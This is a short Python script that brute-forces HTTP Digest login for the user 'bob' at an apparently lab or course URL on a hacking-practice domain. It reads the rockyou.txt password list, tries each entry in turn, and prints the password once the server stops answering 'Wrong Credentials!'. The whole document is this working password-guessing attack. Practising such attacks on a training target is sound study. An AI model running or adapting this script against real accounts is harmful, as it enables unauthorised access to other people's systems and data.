from urllib import response
import requests
from requests.auth import HTTPDigestAuth

with open('rockyou.txt') as file:
    for line in file:
        print("Now trying " + line.rstrip())
        response = requests.get('https://w05-s01.polarbear-hacking.com/home/digest.php', auth=HTTPDigestAuth('bob', line.rstrip()))
        response.encoding = 'utf-8'
        if(response.text != 'Wrong Credentials!'):
            print("Success! Password: " + line.rstrip())
            exit()